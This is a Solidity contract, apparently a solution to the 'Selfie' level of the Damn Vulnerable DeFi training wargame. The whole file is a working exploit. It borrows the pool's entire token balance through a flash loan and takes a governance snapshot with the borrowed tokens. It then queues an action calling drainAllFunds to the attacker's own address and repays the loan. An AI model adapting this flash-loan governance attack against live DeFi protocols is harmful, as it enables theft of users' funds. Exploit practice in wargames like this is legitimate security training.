pragma solidity ^0.6.0;

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;

    function transfer(address, uint256) external;

    function balanceOf(address account) external returns (uint256);
}

contract SelfieAttacker {
    IDamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    ISelfiePool pool;
    address attackerEOA;
    uint256 public actionId;

    constructor(
        IDamnValuableTokenSnapshot _token,
        ISimpleGovernance _governance,
        ISelfiePool _pool
    ) public {
        token = _token;
        governance = _governance;
        pool = _pool;
    }

    function attack() public {
        uint256 flashLoanBalance = token.balanceOf(address(pool));
        attackerEOA = msg.sender;

        // get flash loan
        pool.flashLoan(flashLoanBalance);
    }

    // called by ISelfiePool::flashLoan
    function receiveTokens(
        address, /* tokenAddress */
        uint256 amount
    ) external {
        // received tokens => take a snapshot because it's checked in queueAction
        token.snapshot();

        // we can now queue a government action to drain all funds to attacker account
        // because it checks the balance of governance tokens (which is the same token as the pool token)
        bytes memory drainAllFundsPayload =
            abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
        // store actionId so we can later execute it
        actionId = governance.queueAction(
            address(pool),
            drainAllFundsPayload,
            0
        );

        // pay back to flash loan sender
        token.transfer(address(pool), amount);
    }
}
